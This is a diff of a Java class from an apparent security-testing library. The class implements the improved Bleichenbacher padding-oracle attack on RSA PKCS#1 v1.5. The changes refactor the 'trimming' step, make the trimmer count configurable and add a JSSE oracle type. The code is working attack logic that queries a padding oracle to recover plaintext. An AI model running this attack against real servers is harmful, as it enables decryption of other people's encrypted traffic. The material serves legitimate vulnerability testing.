@@ -22,24 +22,48 @@ import java.util.List;
  * @author Juraj Somorovsky (just adapted for our library)
  * @version 2012-01-21
  */
-public class BleichenbacherCrypto12 extends Bleichenbacher  {
+public class BleichenbacherCrypto12 extends Bleichenbacher {
 
-    // Flags for padding oracles (TTT, TFT, FTT, FFT, FFF are supported)
-    private boolean noterm; // Allow nonterminated padding (no zero byte)
-    private boolean shortpad;// Allow short padding (zero byte in the first 8)
-//    private boolean notlen16; // Allow plaintexts of not 16 bytes length
-    // Flags for attack methods sky
-    final static Boolean USE_SKIPHOLE_METHOD = true;
-    final static Boolean USE_STEP1b_ROUND = true;
-    final static Boolean USE_INTERVAL_LENGTH = false;
+    // Flags for padding oracles (TTT, TFT, FTT, FFT, FFF, JSSE are supported)
+    /**
+     * Allow nonterminated padding (no zero byte)
+     */
+    private boolean noterm;
+    /**
+     * Allow short padding (zero byte in the first 8)
+     */
+    private boolean shortpad;
+    /**
+     * Using Trimming
+     */
+    public final static Boolean USE_STEP1b_ROUND = true;
+    /**
+     * Using interval length
+     */
+    public final static Boolean USE_INTERVAL_LENGTH = false;
     // Flags for skipping-holes method
     // these parameters are very important for the performance of the 1b method
-    static int NUM_TRIMMERS = 1500; // Number of trimming fractions to use
-    static int MAX_ALL_FRACTION_SEARCH = 40; // Max of (num + den) for width first search
-    static int MAX_FEW_FRACTION_SEARCH = 400; // Max of den for depth first search
-    static int MAX_DENOS = 5000;     // Maximum of denominators after taking lcm
+    /**
+     * Number of trimming fractions to use
+     */
+    int numTrimmers;
+    /**
+     * number of trimmers default
+     */
+    public final static int NUM_TRIMMERS = 1500;
+    /**
+     * Max of (num + den) for width first search
+     */
+    public final static int MAX_ALL_FRACTION_SEARCH = 40;
+    /**
+     * Max of den for depth first search
+     */
+    public final static int MAX_FEW_FRACTION_SEARCH = 400;
+    /**
+     * Maximum of denominators after taking lcm
+     */
+    public final static int MAX_DENOS = 5000;
     // Statistic (counter)
-    static long counter = 0;
     static long counter_frac = 0;
     static int maxdenominator = 1;
     static long lcm_real = 1;
@@ -47,11 +71,27 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
     final static BigInteger two = new BigInteger("2");
     final static BigInteger three = new BigInteger("3");
     final static BigInteger _256 = new BigInteger("256");
-    protected BigInteger _2B; 
-    protected BigInteger _3B; 
-    
+    protected BigInteger _2B = bigB.multiply(two);
+    protected BigInteger _3B = bigB.multiply(three);
+
     /**
      * Default constructor with oracle initialization
+     *
+     * @param msg
+     * @param pkcsOracle
+     * @param msgPKCSconform
+     * @param numTrimmers
+     */
+    public BleichenbacherCrypto12(final byte[] msg, AOracle pkcsOracle,
+            final boolean msgPKCSconform, int numTrimmers) {
+        super(msg, pkcsOracle, msgPKCSconform);
+        this.numTrimmers = numTrimmers;
+        this.initOracle();
+    }
+
+    /**
+     * Default constructor with oracle initialization with default trimmers
+     * number
      *
      * @param msg
      * @param pkcsOracle
@@ -60,9 +100,8 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
     public BleichenbacherCrypto12(final byte[] msg, AOracle pkcsOracle,
             final boolean msgPKCSconform) {
         super(msg, pkcsOracle, msgPKCSconform);
+        this.numTrimmers = NUM_TRIMMERS;
         this.initOracle();
-        _2B = bigB.multiply(two);
-        _3B = bigB.multiply(three);
     }
 
     /**
@@ -80,6 +119,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
                 break;
             case FFT:
             case FFF:
+            case JSSE:
                 noterm = false;
                 shortpad = false;
                 break;
@@ -92,6 +132,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
     @Override
     protected void stepOneB() throws OracleException {
         byte[] send;
+        logger.info("Starting step 1b: Trimming");
 
         // Compute n/(9B)
         int _n_div_9B = publicKey.getModulus().divide(bigB.multiply(new BigInteger("9"))).intValue();
@@ -109,180 +150,175 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
         BigInteger lcm_dens_real;
         BigInteger[] FracLower = {BigInteger.ONE, BigInteger.ONE};
         BigInteger[] FracUpper = {BigInteger.ONE, BigInteger.ONE};
-        if (USE_SKIPHOLE_METHOD) {
-            // List of denominators that divide the plaintext
-            List<BigInteger> dens = new LinkedList<BigInteger>();
+        // List of denominators that divide the plaintext
+        List<BigInteger> dens = new LinkedList<BigInteger>();
 
-            // List of trimmers that have been used
-            List<BigInteger[]> usedTrimmers = new LinkedList<BigInteger[]>();
+        // List of trimmers that have been used
+        List<BigInteger[]> usedTrimmers = new LinkedList<BigInteger[]>();
 
-            // Generate (initial) trimmers for lower bound
-            List<BigInteger[]> trimmersLower = getFractionLower(_E0, _F0m1, _n_div_9B);
+        // Generate (initial) trimmers for lower bound
+        List<BigInteger[]> trimmersLower = getFractionLower(_E0, _F0m1, _n_div_9B);
 
-            // Search for denominators (for lower bound)
-            for (BigInteger[] fi : trimmersLower) {
-                BigInteger num = fi[0];
-                BigInteger den = fi[1];
-                // Skip using den if we know den divides the plaintext
-                if (dens.contains(den)) {
-                    continue;
-                }
-
-                send = prepareMsg(c0, num, den);
-                if (oracle.checkPKCSConformity(send)) {
-                    logger.debug("   Aha! A valid padding with "
-                            + num.intValue() + "/" + den.intValue()
-                            + "  (Oracle: " + counter + ")");
-                    // Collect den that divides the plaintext
-                    dens.add(den);
-
-                    // Compute the currently best fraction for lower bound
-                    BigInteger[] newFracLower = updateFrac(FracLower, num, den);
-                    FracLower = newFracLower;
-                }
-                counter_frac++;
-                // Collect the used trimmer fi
-                usedTrimmers.add(fi);
-            }
-            logger.debug(" Fraction for lower bound: "
-                    + FracLower[0] + "/" + FracLower[1]);
-
-            // Generate (initial) trimmers for upper bound
-            List<BigInteger[]> trimmersUpper = getFractionUpper(trimmersLower);
-
-            // Search for denominators (for upper bound)
-            for (BigInteger[] fi : trimmersUpper) {
-                BigInteger num = fi[0];
-                BigInteger den = fi[1];
-                // Skip using den if we know den divides the plaintext
-                if (dens.contains(den)) {
-                    continue;
-                }
-                send = prepareMsg(c0, num, den);
-                if (oracle.checkPKCSConformity(send)) {
-                    logger.debug("   Aha! A valid padding with "
-                            + num.intValue() + "/" + den.intValue()
-                            + "  (Oracle: " + counter + ")");
-                    // Collect den that divides the plaintext
-                    dens.add(den);
-
-                    // Compute the currently best fraction for upper bound
-                    BigInteger[] newFracUpper = updateFrac(FracUpper, num, den);
-                    FracUpper = newFracUpper;
-                }
-                counter_frac++;
-                // Collect the used trimmer fi
-                usedTrimmers.add(fi);
-            }
-            logger.debug(" Fraction for upper bound: "
-                    + FracUpper[0] + "/" + FracUpper[1]);
-
-            // Compute the lcm of denominators
-            logger.debug(" Computing the lcm of denominators...");
-            lcm_real = lcm(dens, Integer.MAX_VALUE);
-            logger.debug("   lcm_real = " + lcm_real);
-            lcm_dens_real = BigInteger.valueOf(lcm_real);
-            BigInteger lcm_dens = getDenominator(dens, MAX_DENOS);
-            maxdenominator = lcm_dens.intValue();
-            logger.debug("   lcm_dens = " + lcm_dens);
-
-            // Compute the minimum/maximum numerators for the lcm of denominators
-            if (lcm_dens.compareTo(BigInteger.ONE) > 0) { // if denominator >= 2 found
-
-                // Generate candidates for the minimum numerator
-                logger.debug(" Start to find minimum numerator:");
-                List<BigInteger> NumLower = getNumeratorL(lcm_dens, _E0, _F0m1);
-                logger.debug("   (from " + NumLower.get(0)
-                        + "/" + lcm_dens
-                        + " to " + NumLower.get(NumLower.size() - 1)
-                        + "/" + lcm_dens + ")");
-
-                // Obtain the order of searching numerators
-                //int[] searchIndexL = getSearchIndex(NumLower.size());
-                int[] searchIndexL = getClassicSearchIndex(NumLower.size());
-
-                // Obtain the minimum numerator for the lcm of denominators
-                int indexMax = NumLower.size() - 1;
-                double FracLowerVal = FracLower[0].doubleValue()
-                        / FracLower[1].doubleValue();
-                for (int index : searchIndexL) {
-                    BigInteger num = NumLower.get(index);
-                    BigInteger[] ni = {num, lcm_dens};
-                    // Check if ni is already used to multply with the ciphertext
-                    Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
-                    double niVal = ni[0].doubleValue() / ni[1].doubleValue();
-
-                    // numerators for lower bound
-                    if (niVal < FracLowerVal && index < indexMax && !IsUsedTrimmer) {
-                        send = prepareMsg(c0, num, lcm_dens);
-                        //System.out.println(" [" + num + ", " + lcm_dens + "]");
-                        counter_frac++;
-                        if (oracle.checkPKCSConformity(send)) {
-                            logger.debug("   Aha! A valid padding with "
-                                    + num.intValue() + "/"
-                                    + lcm_dens.intValue()
-                                    + "  (Oracle: " + counter + ")");
-                            BigInteger[] newFracLower = updateFrac(FracLower, ni[0], ni[1]);
-                            FracLower = newFracLower;
-                            indexMax = index;
-                        }
-                    }
-                }
-
-                // Generate candidates for the maximum numerator
-                logger.debug(" Start to find maximum numerator:");
-                List<BigInteger> NumUpper = getNumeratorU(lcm_dens, _E0, _F0m1);
-                logger.debug("   (from " + NumUpper.get(0)
-                        + "/" + lcm_dens
-                        + " to " + NumUpper.get(NumUpper.size() - 1)
-                        + "/" + lcm_dens + ")");
-
-                // Obtain the order of searching numerators
-                //int[] searchIndexU = getSearchIndex(NumUpper.size());
-                int[] searchIndexU = getClassicSearchIndex(NumUpper.size());
-
-                // Obtain the maximum numerator for the lcm of denominators
-                indexMax = NumUpper.size() - 1;
-                double FracUpperVal = FracUpper[0].doubleValue()
-                        / FracUpper[1].doubleValue();
-                for (int index : searchIndexU) {
-                    BigInteger num = NumUpper.get(index);
-                    BigInteger[] ni = {num, lcm_dens};
-                    // Check if ni is already used to multply with the ciphertext
-                    Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
-                    double niVal = ni[0].doubleValue() / ni[1].doubleValue();
-
-                    // numerators for upper bound
-                    if (niVal > FracUpperVal && index < indexMax && !IsUsedTrimmer) {
-                        send = prepareMsg(c0, num, lcm_dens);
-                        //System.out.println(" [" + num + ", " + lcm_dens + "]");
-                        counter_frac++;
-                        if (oracle.checkPKCSConformity(send)) {
-                            logger.debug("   Aha! A valid padding with "
-                                    + num.intValue() + "/"
-                                    + lcm_dens.intValue()
-                                    + "  (Oracle: " + counter + ")");
-                            BigInteger[] newFracUpper = updateFrac(FracUpper, ni[0], ni[1]);
-                            FracUpper = newFracUpper;
-                            indexMax = index;
-                        }
-                    }
-                }
-
+        // Search for denominators (for lower bound)
+        for (BigInteger[] fi : trimmersLower) {
+            BigInteger num = fi[0];
+            BigInteger den = fi[1];
+            // Skip using den if we know den divides the plaintext
+            if (dens.contains(den)) {
+                continue;
             }
 
-            // Print the obtained fractions for lower and upper bounds
-            logger.debug(" Fraction for lower bound: "
-                    + FracLower[0] + "/" + FracLower[1]);
-            logger.debug(" Fraction for upper bound: "
-                    + FracUpper[0] + "/" + FracUpper[1]);
-            logger.debug(" counter_frac: " + counter_frac);
+            send = prepareMsg(c0, num, den);
+            if (oracle.checkPKCSConformity(send)) {
+                logger.debug("   Aha! A valid padding with "
+                        + num.intValue() + "/" + den.intValue());
+                // Collect den that divides the plaintext
+                dens.add(den);
 
-            // Update the initial interval by using the obtained fractions
-            BigInteger[] new_m = updateM(m[0].lower, m[0].upper, FracLower, FracUpper, _E0, _F0m1, lcm_dens_real);
-
-            m = new Interval[]{new Interval(new_m[0], new_m[1])};
+                // Compute the currently best fraction for lower bound
+                BigInteger[] newFracLower = updateFrac(FracLower, num, den);
+                FracLower = newFracLower;
+            }
+            counter_frac++;
+            // Collect the used trimmer fi
+            usedTrimmers.add(fi);
         }
+        logger.debug(" Fraction for lower bound: "
+                + FracLower[0] + "/" + FracLower[1]);
+
+        // Generate (initial) trimmers for upper bound
+        List<BigInteger[]> trimmersUpper = getFractionUpper(trimmersLower);
+
+        // Search for denominators (for upper bound)
+        for (BigInteger[] fi : trimmersUpper) {
+            BigInteger num = fi[0];
+            BigInteger den = fi[1];
+            // Skip using den if we know den divides the plaintext
+            if (dens.contains(den)) {
+                continue;
+            }
+            send = prepareMsg(c0, num, den);
+            if (oracle.checkPKCSConformity(send)) {
+                logger.debug("   Aha! A valid padding with "
+                        + num.intValue() + "/" + den.intValue());
+                // Collect den that divides the plaintext
+                dens.add(den);
+
+                // Compute the currently best fraction for upper bound
+                BigInteger[] newFracUpper = updateFrac(FracUpper, num, den);
+                FracUpper = newFracUpper;
+            }
+            counter_frac++;
+            // Collect the used trimmer fi
+            usedTrimmers.add(fi);
+        }
+        logger.debug(" Fraction for upper bound: "
+                + FracUpper[0] + "/" + FracUpper[1]);
+
+        // Compute the lcm of denominators
+        logger.debug(" Computing the lcm of denominators...");
+        lcm_real = lcm(dens, Integer.MAX_VALUE);
+        logger.debug("   lcm_real = " + lcm_real);
+        lcm_dens_real = BigInteger.valueOf(lcm_real);
+        BigInteger lcm_dens = getDenominator(dens, MAX_DENOS);
+        maxdenominator = lcm_dens.intValue();
+        logger.debug("   lcm_dens = " + lcm_dens);
+
+        // Compute the minimum/maximum numerators for the lcm of denominators
+        if (lcm_dens.compareTo(BigInteger.ONE) > 0) { // if denominator >= 2 found
+
+            // Generate candidates for the minimum numerator
+            logger.debug(" Start to find minimum numerator:");
+            List<BigInteger> NumLower = getNumeratorL(lcm_dens, _E0, _F0m1);
+            logger.debug("   (from " + NumLower.get(0)
+                    + "/" + lcm_dens
+                    + " to " + NumLower.get(NumLower.size() - 1)
+                    + "/" + lcm_dens + ")");
+
+            // Obtain the order of searching numerators
+            //int[] searchIndexL = getSearchIndex(NumLower.size());
+            int[] searchIndexL = getClassicSearchIndex(NumLower.size());
+
+            // Obtain the minimum numerator for the lcm of denominators
+            int indexMax = NumLower.size() - 1;
+            double FracLowerVal = FracLower[0].doubleValue()
+                    / FracLower[1].doubleValue();
+            for (int index : searchIndexL) {
+                BigInteger num = NumLower.get(index);
+                BigInteger[] ni = {num, lcm_dens};
+                // Check if ni is already used to multply with the ciphertext
+                Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
+                double niVal = ni[0].doubleValue() / ni[1].doubleValue();
+
+                // numerators for lower bound
+                if (niVal < FracLowerVal && index < indexMax && !IsUsedTrimmer) {
+                    send = prepareMsg(c0, num, lcm_dens);
+                    //System.out.println(" [" + num + ", " + lcm_dens + "]");
+                    counter_frac++;
+                    if (oracle.checkPKCSConformity(send)) {
+                        logger.debug("   Aha! A valid padding with "
+                                + num.intValue() + "/"
+                                + lcm_dens.intValue());
+                        BigInteger[] newFracLower = updateFrac(FracLower, ni[0], ni[1]);
+                        FracLower = newFracLower;
+                        indexMax = index;
+                    }
+                }
+            }
+
+            // Generate candidates for the maximum numerator
+            logger.debug(" Start to find maximum numerator:");
+            List<BigInteger> NumUpper = getNumeratorU(lcm_dens, _E0, _F0m1);
+            logger.debug("   (from " + NumUpper.get(0)
+                    + "/" + lcm_dens
+                    + " to " + NumUpper.get(NumUpper.size() - 1)
+                    + "/" + lcm_dens + ")");
+
+            // Obtain the order of searching numerators
+            //int[] searchIndexU = getSearchIndex(NumUpper.size());
+            int[] searchIndexU = getClassicSearchIndex(NumUpper.size());
+
+            // Obtain the maximum numerator for the lcm of denominators
+            indexMax = NumUpper.size() - 1;
+            double FracUpperVal = FracUpper[0].doubleValue()
+                    / FracUpper[1].doubleValue();
+            for (int index : searchIndexU) {
+                BigInteger num = NumUpper.get(index);
+                BigInteger[] ni = {num, lcm_dens};
+                // Check if ni is already used to multply with the ciphertext
+                Boolean IsUsedTrimmer = pairContainedIn(ni, usedTrimmers);
+                double niVal = ni[0].doubleValue() / ni[1].doubleValue();
+
+                // numerators for upper bound
+                if (niVal > FracUpperVal && index < indexMax && !IsUsedTrimmer) {
+                    send = prepareMsg(c0, num, lcm_dens);
+                    //System.out.println(" [" + num + ", " + lcm_dens + "]");
+                    counter_frac++;
+                    if (oracle.checkPKCSConformity(send)) {
+                        logger.debug("   Aha! A valid padding with "
+                                + num.intValue() + "/"
+                                + lcm_dens.intValue());
+                        BigInteger[] newFracUpper = updateFrac(FracUpper, ni[0], ni[1]);
+                        FracUpper = newFracUpper;
+                        indexMax = index;
+                    }
+                }
+            }
+
+        }
+
+        // Print the obtained fractions for lower and upper bounds
+        logger.debug(" Fraction for lower bound: "
+                + FracLower[0] + "/" + FracLower[1]);
+        logger.debug(" Fraction for upper bound: "
+                + FracUpper[0] + "/" + FracUpper[1]);
+        logger.debug(" counter_frac: " + counter_frac);
+
+        // Update the initial interval by using the obtained fractions
+        BigInteger[] new_m = updateM(m[0].lower, m[0].upper, FracLower, FracUpper, _E0, _F0m1, lcm_dens_real);
+
+        m = new Interval[]{new Interval(new_m[0], new_m[1])};
+
 //        System.out.println("Used queries: " + oracle.getNumberOfQueries());
     }
 
@@ -463,16 +499,16 @@ public class BleichenbacherCrypto12 extends Bleichenbacher  {
                         break;
                     }
                     i--;
-                    if (trimmers.size() >= NUM_TRIMMERS / 2) {
+                    if (trimmers.size() >= numTrimmers / 2) {
                         break;
                     }
                 }
-                if (trimmers.size() >= NUM_TRIMMERS / 2) {
+                if (trimmers.size() >= numTrimmers / 2) {
                     break;
                 }
             }
             k++;
-        } while (trimmers.size() < NUM_TRIMMERS / 2);
+        } while (trimmers.size() < numTrimmers / 2);
         logger.debug("   loop num: " + k);
         logger.debug("   length of trimmers: " + trimmers.size() + " last j: " + j);
         return trimmers;
